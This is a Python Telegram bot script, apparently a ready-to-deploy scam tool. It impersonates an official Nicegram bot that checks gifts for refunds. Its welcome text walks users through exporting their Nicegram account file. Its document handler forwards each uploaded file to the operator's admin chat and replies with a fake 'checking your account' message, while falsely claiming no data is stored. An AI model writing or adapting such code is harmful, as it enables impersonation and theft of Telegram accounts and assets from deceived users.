import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    MessageHandler, 
    filters, 
    ContextTypes,
    CallbackQueryHandler
)

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Настройки (ЗАМЕНИТЕ НА СВОИ!)
BOT_TOKEN = os.getenv("BOT_TOKEN") # Вставьте токен от @BotFather
ADMIN_ID = int(os.getenv("ADMIN_ID")) # Вставьте ваш ID от @userinfobot

# Хранилище активных пользователей
active_users = {}

# Функция для получения имени пользователя
def get_user_display_name(user):
    if user.first_name and user.last_name:
        return f"{user.first_name} {user.last_name}"
    elif user.first_name:
        return user.first_name
    elif user.username:
        return f"@{user.username}"
    else:
        return "пользователь"

# Обработчик команды /start
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_display_name = get_user_display_name(user)
    
    welcome_text = f"""Hello, {user_display_name}! 👋

I am a bot from Nicegram, the official Telegram client.

My responsibilities include:
• Checking if gifts have refunds
• Detecting suspicious activity
• Reviewing gift history

To allow me to check your account:
1. Download Nicegram
2. Log in to the account you want to check
3. Go to Settings → select the Nicegram tab
4. Scroll down and find "Export as file"
5. Click Export and send the generated file to this bot

After that, the bot will check your account and provide a report.

⚠️ Important: The bot does not store your data and uses it only to check gifts."""
    
    await update.message.reply_text(welcome_text)

# Обработчик документов
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_display_name = get_user_display_name(user)
    
    # Уведомляем администратора
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"📁 Файл от пользователя: {user_display_name} (ID: {user.id})"
    )
    
    # Пересылаем файл
    await context.bot.forward_message(
        chat_id=ADMIN_ID,
        from_chat_id=update.effective_chat.id,
        message_id=update.message.message_id
    )
    
    await update.message.reply_text(f"📥 File received, {user_display_name}! I am starting to check your gifts and account. Please wait.")

# Основная функция
def main():
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Запускаем бота
    print("🤖 Бот запускается...")
    print(f"👑 ID администратора: {ADMIN_ID}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
